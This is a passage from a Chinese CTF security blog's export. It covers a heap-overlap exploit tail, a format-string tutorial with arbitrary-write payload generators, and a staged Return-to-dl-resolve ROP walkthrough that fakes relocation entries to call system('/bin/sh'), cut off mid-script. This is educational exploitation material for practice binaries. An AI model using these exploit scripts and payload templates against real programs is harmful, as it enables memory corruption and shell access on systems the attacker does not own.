class="line">add(<span class="number">0x50</span>, p64(<span class="number">0</span>))</span><br><span class="line">add(<span class="number">0x50</span>, <span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">add(<span class="number">0x50</span>, <span class="string">"\x00"</span> * <span class="number">6</span> + p64(<span class="number">0x41</span>) + p32(<span class="number">0x4006A0</span>) + <span class="string">"\x00"</span> * <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">"3"</span>)</span><br><span class="line">r.sendlineafter(<span class="string">"The id you want to delete:"</span>, str(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">libc = u64(r.recvuntil(<span class="string">"\n"</span>).ljust(<span class="number">8</span>, <span class="string">"\x00"</span>)) + <span class="number">0x7fb44b795000</span> - <span class="number">0xa7fb44b7cbe80</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x30</span>, p64(<span class="number">0x602008</span>))</span><br><span class="line">add(<span class="number">0x30</span>, p64(<span class="number">0</span>))</span><br><span class="line">add(<span class="number">0x30</span>, <span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">add(<span class="number">0x30</span>, p64(libc + <span class="number">0x45390</span>)[:<span class="number">7</span>])</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">"3"</span>)</span><br><span class="line">r.sendlineafter(<span class="string">"The id you want to delete:"</span>, str(<span class="number">15</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc: "</span> + hex(libc)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>堆重叠</tag>
      </tags>
  </entry>
  <entry>
    <title>格式化字符串漏洞</title>
    <url>/year/11/03/cl7iordqi0059293fnvuu2dsm/</url>
    <content><![CDATA[<h2 id="0x00-Emm。。。"><a href="#0x00-Emm。。。" class="headerlink" title="0x00 Emm。。。"></a>0x00 Emm。。。</h2><p>今天做了个河北师范大学招新赛的题，发现好多格式化字符串的题目，以前确实做的很少，正好现在重新总结下。</p>
<a id="more"></a>
<h2 id="0x01-格式化字符串漏洞原理"><a href="#0x01-格式化字符串漏洞原理" class="headerlink" title="0x01 格式化字符串漏洞原理"></a>0x01 格式化字符串漏洞原理</h2><p>格式化字符串函数是<strong>根据格式化字符串函数来进行解析的</strong>。那么相应的要被解析的参数的个数也自然是由这个格式化字符串所控制。<br>在进入 printf 之后，函数首先获取第一个参数，一个一个读取其字符会遇到两种情况</p>
<ul>
<li>当前字符不是 %，直接输出到相应标准输出。</li>
<li>当前字符是 %， 继续读取下一个字符<ul>
<li>如果没有字符，报错</li>
<li>如果下一个字符是 %, 输出 %</li>
<li>否则根据相应的字符，获取相应的参数，对其进行解析并输出</li>
</ul>
</li>
</ul>
<p>那么假设，此时我们在编写程序时候，写成了下面的样子</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"Color %s, Number %d, Float %4.2f"</span>);</span><br></pre></td></tr></table></figure>

<p>此时我们可以发现我们并没有提供参数，那么程序会如何运行呢？程序照样会运行，会将栈上存储格式化字符串地址上面的三个变量分别解析为</p>
<ol>
<li>解析其地址对应的字符串</li>
<li>解析其内容对应的整形值</li>
<li>解析其内容对应的浮点值</li>
</ol>
<h2 id="0x02-格式化字符串漏洞的利用"><a href="#0x02-格式化字符串漏洞的利用" class="headerlink" title="0x02 格式化字符串漏洞的利用"></a>0x02 格式化字符串漏洞的利用</h2><p>主要利用情况有：</p>
<ul>
<li>泄露栈上的数据</li>
<li>任意地址读</li>
<li>任意地址写</li>
</ul>
<h2 id="0x03-任意地址写模板"><a href="#0x03-任意地址写模板" class="headerlink" title="0x03 任意地址写模板"></a>0x03 任意地址写模板</h2><h3 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fmt</span><span class="params">(prev, word, index)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> prev &lt; word:</span><br><span class="line">        result = word - prev</span><br><span class="line">        fmtstr = <span class="string">"%"</span> + str(result) + <span class="string">"c"</span></span><br><span class="line">    <span class="keyword">elif</span> prev == word:</span><br><span class="line">        result = <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result = <span class="number">256</span> + word - prev</span><br><span class="line">        fmtstr = <span class="string">"%"</span> + str(result) + <span class="string">"c"</span></span><br><span class="line">    fmtstr += <span class="string">"%"</span> + str(index) + <span class="string">"$hhn"</span></span><br><span class="line">    <span class="keyword">return</span> fmtstr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fmt_str</span><span class="params">(offset, size, addr, target)</span>:</span></span><br><span class="line">    payload = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">        <span class="keyword">if</span> size == <span class="number">4</span>:</span><br><span class="line">            payload += p32(addr + i)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            payload += p64(addr + i)</span><br><span class="line">    prev = len(payload)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">        payload += fmt(prev, (target &gt;&gt; i * <span class="number">8</span>) &amp; <span class="number">0xff</span>, offset + i)</span><br><span class="line">        prev = (target &gt;&gt; i * <span class="number">8</span>) &amp; <span class="number">0xff</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line">payload = fmt_str(<span class="number">6</span>,<span class="number">4</span>,<span class="number">0x0804A028</span>,<span class="number">0x12345678</span>)</span><br></pre></td></tr></table></figure>

<p><strong>值得注意的是因为64位地址有<code>\x00</code>会导致<code>printf</code>输出被截断，所以64位的话要把要修改的地址放在后面才行</strong></p>
<h3 id="64位"><a href="#64位" class="headerlink" title="64位"></a>64位</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fmt</span><span class="params">(prev, word, index)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> prev &lt; word:</span><br><span class="line">        result = word - prev</span><br><span class="line">        fmtstr = <span class="string">"%"</span> + str(result) + <span class="string">"c"</span></span><br><span class="line">    <span class="keyword">elif</span> prev == word:</span><br><span class="line">        result = <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result = <span class="number">256</span> + word - prev</span><br><span class="line">        fmtstr = <span class="string">"%"</span> + str(result) + <span class="string">"c"</span></span><br><span class="line">    fmtstr += <span class="string">"%"</span> + str(index) + <span class="string">"$hhn"</span></span><br><span class="line">    <span class="keyword">return</span> fmtstr</span><br><span class="line"></span><br><span class="line">target = system_addr</span><br><span class="line">prev = <span class="number">0</span></span><br><span class="line">payload = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">    payload += fmt(prev, (target&gt;&gt;i*<span class="number">8</span>) &amp; <span class="number">0xff</span>, <span class="number">22</span>+i)</span><br><span class="line">    prev = (target&gt;&gt;i*<span class="number">8</span>) &amp; <span class="number">0xff</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x80</span>,<span class="string">'\x00'</span>)</span><br><span class="line">payload += p64(printf_got)</span><br><span class="line">payload += p64(printf_got + <span class="number">1</span>)</span><br><span class="line">payload += p64(printf_got + <span class="number">2</span>)</span><br><span class="line">payload += p64(printf_got + <span class="number">3</span>)</span><br></pre></td></tr></table></figure>

<h3 id="个人经验"><a href="#个人经验" class="headerlink" title="个人经验"></a>个人经验</h3><p>算完偏移用aaaaaaaa%n$p试一下，会稳很多</p>
<h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p>ctfwiki: <a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/fmtstr_intro-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/fmtstr_intro-zh/</a></p>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
  </entry>
  <entry>
    <title>Return-to-dl-resolve总结</title>
    <url>/year/11/01/cl7iordp2001e293ftdy86l8u/</url>
    <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>这个利用方式跟重定位和动态链接有关，现在复习跟总结下</p>
<a id="more"></a>
<h2 id="0x01-准备知识"><a href="#0x01-准备知识" class="headerlink" title="0x01 准备知识"></a>0x01 准备知识</h2><h3 id="延迟绑定"><a href="#延迟绑定" class="headerlink" title="延迟绑定"></a>延迟绑定</h3><p>为了减少存储器浪费，现代操作系统支持动态链接特性。即不是在程序编译的时候就把外部的库函数编译进去，而是在运行时再把包含有对应函数的库加载到内存里。由于内存空间有限，选用函数库的组合无限，显然程序不可能在运行之前就知道自己用到的函数会在哪个地址上。比如说对于libc.so来说，我们要求把它加载到地址0x1000处，A程序只引用了libc.so，从理论上来说这个要求不难办到。但是对于用了liba,so, libb.so, libc.so……liby.so, libz.so的B程序来说，0x1000这个地址可能就被liba.so等库占据了。因此，程序在运行时碰到了外部符号，就需要去找到它们真正的内存地址，这个过程被称为重定位。为了安全，现代操作系统的设计要求代码所在的内存必须是不可修改的，那么诸如call read一类的指令即没办法在编译阶段直接指向read函数所在地址，又没办法在运行时修改成read函数所在地址，怎么保证CPU在运行到这行指令时能正确跳到read函数呢？这就需要got表（Global Offset Table，全局偏移表）和plt表（Procedure Linkage Table，过程链接表）进行辅助了。</p>
<h3 id="调用流程"><a href="#调用流程" class="headerlink" title="调用流程"></a>调用流程</h3><p>来看一下一个<code>setvbuf</code>函数的调用过程<br><img src="/01/cl7iordp2001e293ftdy86l8u/2.png" alt></p>
<ul>
<li><code>jmp</code>到了<code>setvbug</code>函数对应的<code>got</code>表位置，这个时候<code>got</code>表中存储的是该函数<code>plt</code>表中的下一条指令，相当于没跳转。</li>
<li><code>push</code>了一个0x20，这个代表这个函数的id号，后面要用这个来寻找它的重定位表项</li>
<li><code>jump</code>到<code>plt[0]</code>,<code>push</code>了link_map.</li>
<li>最后<code>jump</code>到了<code>dl_resolve</code> 函数.对符号进行解析</li>
</ul>
<p>调用的流程图如下<br><img src="/01/cl7iordp2001e293ftdy86l8u/1.png" alt></p>
<h3 id="相关结构"><a href="#相关结构" class="headerlink" title="相关结构"></a>相关结构</h3><h4 id="dynamic"><a href="#dynamic" class="headerlink" title=".dynamic"></a>.dynamic</h4><p><img src="/01/cl7iordp2001e293ftdy86l8u/3.png" alt><br>这个section的用处就是他包含了很多动态链接所需的关键信息，我们现在只关心DT_STRTAB, DT_SYMTAB, DT_JMPREL这三项，这三个东西分别包含了指向<code>.dynstr</code>, .<code>dynsym,</code> <code>.rel.plt</code>这3个section的指针</p>
<h4 id="dynstr"><a href="#dynstr" class="headerlink" title=".dynstr"></a>.dynstr</h4><p><img src="/01/cl7iordp2001e293ftdy86l8u/4.png" alt><br>一个字符串表，index为0的地方永远是0，然后后面是动态链接所需的字符串，0结尾，包括导入函数名，比方说这里很明显有个puts。到时候，相关数据结构引用一个字符串时，<strong>用的是相对这个section头的偏移</strong>，比方说，在这里，就是字符串相对0x804821C的偏移。)</p>
<h4 id="dynsym"><a href="#dynsym" class="headerlink" title=".dynsym"></a>.dynsym</h4><p><img src="/01/cl7iordp2001e293ftdy86l8u/5.png" alt><br>这个东西，是一个符号表（结构体数组），里面记录了各种符号的信息，每个结构体对应一个符号。我们这里只关心函数符号，比方说上面的puts。结构体定义如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Word    st_name; <span class="comment">//符号名，是相对.dynstr起始的偏移，这种引用字符串的方式在前面说过了</span></span><br><span class="line">  Elf32_Addr    st_value;</span><br><span class="line">  Elf32_Word    st_size;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> st_info; <span class="comment">//对于导入函数符号而言，它是0x12</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> st_other;</span><br><span class="line">  Elf32_Section st_shndx;</span><br><span class="line">&#125;Elf32_Sym; <span class="comment">//对于导入函数符号而言，其他字段都是0</span></span><br></pre></td></tr></table></figure>

<h4 id="rel-plt"><a href="#rel-plt" class="headerlink" title=".rel.plt"></a>.rel.plt</h4><p><img src="/01/cl7iordp2001e293ftdy86l8u/6.png" alt><br>这里是重定位表（不过跟windows那个重定位表概念不同），也是一个结构体数组，每个项对应一个导入函数。结构体定义如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Addr    r_offset; <span class="comment">//指向GOT表的指针</span></span><br><span class="line">  Elf32_Word    r_info;</span><br><span class="line">  <span class="comment">//一些关于导入符号的信息，我们只关心从第二个字节开始的值((val)&gt;&gt;8)，忽略那个07</span></span><br><span class="line">  <span class="comment">//1和3是这个导入函数的符号在.dynsym中的下标，</span></span><br><span class="line">  <span class="comment">//如果往回看的话你会发现1和3刚好和.dynsym的puts和__libc_start_main对应</span></span><br><span class="line">&#125; Elf32_Rel;</span><br></pre></td></tr></table></figure>

<p>_dl_fixup是在glibc-2.23/elf/dl-runtime.c实现的，我们只关注一些主要函数。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_dl_fixup(struct link_map *l, ElfW(Word) reloc_arg)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 首先通过参数reloc_arg计算重定位入口，这里的JMPREL即.rel.plt，reloc_offset即reloc_arg</span></span><br><span class="line">    <span class="keyword">const</span> PLTREL *<span class="keyword">const</span> reloc = (<span class="keyword">const</span> <span class="keyword">void</span> *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);</span><br><span class="line">    <span class="comment">// 然后通过reloc-&gt;r_info找到.dynsym中对应的条目</span></span><br><span class="line">    <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *sym </span>= &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</span><br><span class="line">    <span class="comment">// 这里还会检查reloc-&gt;r_info的最低位是不是R_386_JUMP_SLOT=7</span></span><br><span class="line">    assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);</span><br><span class="line">    <span class="comment">// 接着通过strtab+sym-&gt;st_name找到符号表字符串，result为libc基地址</span></span><br><span class="line">    result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope, version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">// value为libc基址加上要解析函数的偏移地址，也即实际地址</span></span><br><span class="line">    value = DL_FIXUP_MAKE_VALUE (result, sym ? (LOOKUP_VALUE_ADDRESS (result) + sym-&gt;st_value) : <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// 最后把value写入相应的GOT表条目中</span></span><br><span class="line">    <span class="keyword">return</span> elf_machine_fixup_plt (l, result, reloc, rel_addr, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="dl-runtime-resolve会"><a href="#dl-runtime-resolve会" class="headerlink" title="_dl_runtime_resolve会"></a>_dl_runtime_resolve会</h4><ol>
<li>用<code>link_map</code>访问<code>.dynamic</code>，取出<code>.dynstr</code>, <code>.dynsym</code>, <code>.rel.plt</code>的指针</li>
<li><code>.rel.plt</code> + 第二个参数求出当前函数的重定位表项<code>Elf32_Rel</code>的指针，记作<code>rel</code></li>
<li><code>rel-&gt;r_info &gt;&gt; 8</code>作为<code>.dynsym</code>的下标，求出当前函数的符号表项<code>Elf32_Sym</code>的指针，记作<code>sym</code></li>
<li><code>.dynstr + sym-&gt;st_name</code>得出符号名字符串指针</li>
<li>在动态链接库查找这个函数的地址，并且把地址赋值给<code>*rel-&gt;r_offset</code>，即GOT表</li>
<li>调用这个函数</li>
</ol>
<p>实际上好像都是把<code>st_name</code>转成hash值在libc函数里进行查找的，不过我也没仔细看源码，不是很确定</p>
<h2 id="0x02-漏洞利用方式"><a href="#0x02-漏洞利用方式" class="headerlink" title="0x02 漏洞利用方式"></a>0x02 漏洞利用方式</h2><ol>
<li>控制<code>eip</code>为PLT[0]的地址，只需传递一个<code>index_arg</code>参数</li>
<li>控制<code>index_arg</code>的大小，使<code>reloc</code>的位置落在可控地址内</li>
<li>伪造<code>reloc</code>的内容，使<code>sym</code>落在可控地址内</li>
<li>伪造<code>sym</code>的内容，使<code>name</code>落在可控地址内</li>
<li>伪造<code>name</code>为任意库函数，如<code>system</code></li>
</ol>
<p><strong>此外，这个攻击成功的很必要的条件</strong></p>
<ul>
<li><strong>dl_resolve 函数不会检查对应的符号是否越界，它只会根据我们所给定的数据来执行。</strong></li>
<li><strong>dl_resolve 函数最后的解析根本上依赖于所给定的字符串。</strong><h3 id="stage1"><a href="#stage1" class="headerlink" title="stage1"></a>stage1</h3>我们先写一个ROP链，直到返回到write@plt<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">'bof'</span>)</span><br><span class="line">offset = <span class="number">112</span></span><br><span class="line">read_plt = elf.plt[<span class="string">'read'</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">'write'</span>]</span><br><span class="line"></span><br><span class="line">ppp_ret = <span class="number">0x08048619</span> <span class="comment"># ROPgadget --binary bof --only "pop|ret"</span></span><br><span class="line">pop_ebp_ret = <span class="number">0x0804861b</span></span><br><span class="line">leave_ret = <span class="number">0x08048458</span> <span class="comment"># ROPgadget --binary bof --only "leave|ret"</span></span><br><span class="line"></span><br><span class="line">stack_size = <span class="number">0x800</span></span><br><span class="line">bss_addr = <span class="number">0x0804a040</span> <span class="comment"># readelf -S bof | grep ".bss"</span></span><br><span class="line">base_stage = bss_addr + stack_size</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">'./bof'</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">'Welcome to XDCTF2015~!\n'</span>)</span><br><span class="line">payload = <span class="string">'A'</span> * offset</span><br><span class="line">payload += p32(read_plt) <span class="comment"># 读100个字节到base_stage</span></span><br><span class="line">payload += p32(ppp_ret)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(base_stage)</span><br><span class="line">payload += p32(<span class="number">100</span>)</span><br><span class="line">payload += p32(pop_ebp_ret) <span class="comment"># 把base_stage pop到ebp中</span></span><br><span class="line">payload += p32(base_stage)</span><br><span class="line">payload += p32(leave_ret) <span class="comment"># mov esp, ebp ; pop ebp ;将esp指向base_stage</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">"/bin/sh"</span></span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">'AAAA'</span> <span class="comment"># 接上一个payload的leave-&gt;pop ebp ; ret</span></span><br><span class="line">payload2 += p32(write_plt)</span><br><span class="line">payload2 += <span class="string">'AAAA'</span></span><br><span class="line">payload2 += p32(<span class="number">1</span>)</span><br><span class="line">payload2 += p32(base_stage + <span class="number">80</span>)</span><br><span class="line">payload2 += p32(len(cmd))</span><br><span class="line">payload2 += <span class="string">'A'</span> * (<span class="number">80</span> - len(payload2))</span><br><span class="line">payload2 += cmd + <span class="string">'\x00'</span></span><br><span class="line">payload2 += <span class="string">'A'</span> * (<span class="number">100</span> - len(payload2))</span><br><span class="line">r.sendline(payload2)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h3 id="stage2"><a href="#stage2" class="headerlink" title="stage2"></a>stage2</h3><p>这次控制eip返回PLT[0]，要带上write的index_offset。这里修改一下payload2</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">cmd = <span class="string">"/bin/sh"</span></span><br><span class="line">plt_0 = <span class="number">0x08048380</span> <span class="comment"># objdump -d -j .plt bof</span></span><br><span class="line">index_offset = <span class="number">0x20</span> <span class="comment"># write's index</span></span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">'AAAA'</span></span><br><span class="line">payload2 += p32(plt_0)</span><br><span class="line">payload2 += p32(index_offset)</span><br><span class="line">payload2 += <span class="string">'AAAA'</span></span><br><span class="line">payload2 += p32(<span class="number">1</span>)</span><br><span class="line">payload2 += p32(base_stage + <span class="number">80</span>)</span><br><span class="line">payload2 += p32(len(cmd))</span><br><span class="line">payload2 += <span class="string">'A'</span> * (<span class="number">80</span> - len(payload2))</span><br><span class="line">payload2 += cmd + <span class="string">'\x00'</span></span><br><span class="line">payload2 += <span class="string">'A'</span> * (<span class="number">100</span> - len(payload2))</span><br><span class="line">r.sendline(payload2)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="stage3"><a href="#stage3" class="headerlink" title="stage3"></a>stage3</h3><p>这次控制<code>index_offset</code>，使其指向我们构造的<code>fake_reloc</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">cmd = <span class="string">"/bin/sh"</span></span><br><span class="line">plt_0 = <span class="number">0x08048380</span> <span class="comment"># objdump -d -j .plt bof</span></span><br><span class="line">rel_plt = <span class="number">0x08048330</span> <span class="comment"># objdump -s -j .rel.plt bof</span></span><br><span class="line">index_offset = (base_stage + <span class="number">28</span>) - rel_plt <span class="comment"># base_stage + 28指向fake_reloc，减去rel_plt即偏移</span></span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">r_info = <span class="number">0x607</span> <span class="comment"># write: Elf32_Rel-&gt;r_info</span></span><br><span class="line">fake_reloc = p32(write_got) + p32(r_info)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">'AAAA'</span></span><br><span class="line">payload2 += p32(plt_0)</span><br><span class="line">payload2 += p32(index_offset)</span><br><span class="line">payload2 += <span class="string">'AAAA'</span></span><br><span class="line">payload2 += p32(<span class="number">1</span>)</span><br><span class="line">payload2 += p32(base_stage + <span class="number">80</span>)</span><br><span class="line">payload2 += p32(len(cmd))</span><br><span class="line">payload2 += fake_reloc <span class="comment"># (base_stage+28)的位置</span></span><br><span class="line">payload2 += <span class="string">'A'</span> * (<span class="number">80</span> - len(payload2))</span><br><span class="line">payload2 += cmd + <span class="string">'\x00'</span></span><br><span class="line">payload2 += <span class="string">'A'</span> * (<span class="number">100</span> - len(payload2))</span><br><span class="line">r.sendline(payload2)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="stage4"><a href="#stage4" class="headerlink" title="stage4"></a>stage4</h3><p>这一次构造<code>fake_sym</code>，使其指向我们控制的<code>st_name</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">cmd = <span class="string">"/bin/sh"</span></span><br><span class="line">plt_0 = <span class="number">0x08048380</span></span><br><span class="line">rel_plt = <span class="number">0x08048330</span></span><br><span class="line">index_offset = (base_stage + <span class="number">28</span>) - rel_plt</span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">dynsym = <span class="number">0x080481d8</span></span><br><span class="line">dynstr = <span class="number">0x08048278</span></span><br><span class="line">fake_sym_addr = base_stage + <span class="number">36</span></span><br><span class="line">align = <span class="number">0x10</span> - ((fake_sym_addr - dynsym) &amp; <span class="number">0xf</span>) <span class="comment"># 这里的对齐操作是因为dynsym里的Elf32_Sym结构体都是0x10字节大小</span></span><br><span class="line">fake_sym_addr = fake_sym_addr + align</span><br><span class="line">index_dynsym = (fake_sym_addr - dynsym) / <span class="number">0x10</span> <span class="comment"># 除以0x10因为Elf32_Sym结构体的大小为0x10，得到write的dynsym索引号</span></span><br><span class="line">r_info = (index_dynsym &lt;&lt; <span class="number">8</span>) | <span class="number">0x7</span></span><br><span class="line">fake_reloc = p32(write_got) + p32(r_info)</span><br><span class="line">st_name = <span class="number">0x4c</span></span><br><span class="line">fake_sym = p32(st_name) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x12</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">'AAAA'</span></span><br><span class="line">payload2 += p32(plt_0)</span><br><span class="line">payload2 += p32(index_offset)</span><br><span class="line">payload2 += <span class="string">'AAAA'</span></span><br><span class="line">payload2 += p32(<span class="number">1</span>)</span><br><span class="line">payload2 += p32(base_stage + <span class="number">80</span>)</span><br><span class="line">payload2 += p32(len(cmd))</span><br><span class="line">payload2 += fake_reloc <span class="comment"># (base_stage+28)的位置</span></span><br><span class="line">payload2 += <span class="string">'B'</span> * align</span><br><span class="line">payload2 += fake_sym <span class="comment"># (base_stage+36)的位置</span></span><br><span class="line">payload2 += <span class="string">'A'</span> * (<span class="number">80</span> - len(payload2))</span><br><span class="line">payload2 += cmd + <span class="string">'\x00'</span></span><br><span class="line">payload2 += <span class="string">'A'</span> * (<span class="number">100</span> - len(payload2))</span><br><span class="line">r.sendline(payload2)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="stage5"><a href="#stage5" class="headerlink" title="stage5"></a>stage5</h3><p>把<code>st_name</code>指向输入的字符串<code>&quot;write&quot;</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">cmd = <span class="string">"/bin/sh"</span></span><br><span class="line">plt_0 = <span class="number">0x08048380</span></span><br><span class="line">rel_plt = <span class="number">0x08048330</span></span><br><span class="line">index_offset = (base_stage + <span class="number">28</span>) - rel_plt</span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">dynsym = <span class="number">0x080481d8</span></span><br><span class="line">dynstr = <span class="number">0x08048278</span></span><br><span class="line">fake_sym_addr = base_stage + <span class="number">36</span></span><br><span class="line">align = <span class="number">0x10</span> - ((fake_sym_addr - dynsym) &amp; <span class="number">0xf</span>)</span><br><span class="line">fake_sym_addr = fake_sym_addr + align</span><br><span class="line">index_dynsym = (fake_sym_addr - dynsym) / <span class="number">0x10</span></span><br><span class="line">r_info = (index_dynsym &lt;&lt; <span class="number">8</span>) | <span class="number">0x7</span></span><br><span class="line">fake_reloc = p32(write_got) + p32(r_info)</span><br><span class="line">st_name = (fake_sym_addr + <span class="number">0x10</span>) - dynstr <span class="comment"># 加0x10因为Elf32_Sym的大小为0x10</span></span><br><span class="line">fake_sym = p32(st_name) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x12</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">'AAAA'</span></span><br><span class="line">payload2 += p32(plt_0)</span><br><span class="line">payload2 += p32(index_offset)</span><br><span class="line">payload2 += <span class="string">'AAAA'</span></span><br><span class="line">payload2 += p32(<span class="number">1</span>)</span><br><span class="line">payload2 += p32(base_stage + <span class="number">80</span>)</span><br><span class="line">payload2 += p32(len(cmd))</span><br><span class="line">payload2 += fake_reloc <span class="comment"># (base_stage+28)的位置</span></span><br><span class="line">payload2 += <span class="string">'B'</span> * align</span><br><span class="line">payload2 += fake_sym <span class="comment"># (base_stage+36)的位置</span></span><br><span class="line">payload2 += <span class="string">"write\x00"</span></span><br><span class="line">payload2 += <span class="string">'A'</span> * (<span class="number">80</span> - len(payload2))</span><br><span class="line">payload2 += cmd + <span class="string">'\x00'</span></span><br><span class="line">payload2 += <span class="string">'A'</span> * (<span class="number">100</span> - len(payload2))</span><br><span class="line">r.sendline(payload2)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="stage6"><a href="#stage6" class="headerlink" title="stage6"></a>stage6</h3><p>替换<code>write</code>为<code>system</code>，并修改<code>system</code>的参数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">cmd = <span class="string">"/bin/sh"</span></span><br><span class="line">plt_0 = <span class="number">0x08048380</span></span><br><span class="line">rel_plt = <span class="number">0x08048330</span></span><br><span class="line">index_offset = (base_stage + <span class="number">28</span>) - rel_plt</span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">dynsym = <span class="number">0x080481d8</span></span><br><span class="line">dynstr = <span class="number">0x08048278</span></span><br><span class="line">fake_sym_addr = base_stage + <span class="number">36</span></span><br><span class="line">align = <span class="number">0x10</span> - ((fake_sym_addr - dynsym) &amp; <span class="number">0xf</span>)</span><br><span class="line">fake_sym_addr = fake_sym_addr + align</span><br><span class="line">index_dynsym = (fake_sym_addr - dynsym) / <span class="number">0x10</span></span><br><span class="line">r_info = (index_dynsym &lt;&lt; <span class="number">8</span>) | <span class="number">0x7</span></span><br><span class="line">fake_reloc = p32(write_got) + p32(r_info)</span><br><span class="line">st_name = (fake_sym_addr + <span class="number">0x10</span>) - dynstr</span><br><span class="line">fake_sym = p32(st_name) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x12</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">'AAAA'</span></span><br><span class="line">payload2 += p32(plt_0)</span><br><span class="line">payload2 += p32(index_offset)</span><br><span class="line">payload2 += <span class="string">'AAAA'</span></span><br><span class="line">payload2 += p32(base_stage + <span class="number">80</span>)</span><br><span class="line">payload2 += <span class="string">'aaaa'</span></span><br><span class="line">payload2 += <span class="string">'aaaa'</span></span><br><span class="line">payload2 += fake_reloc 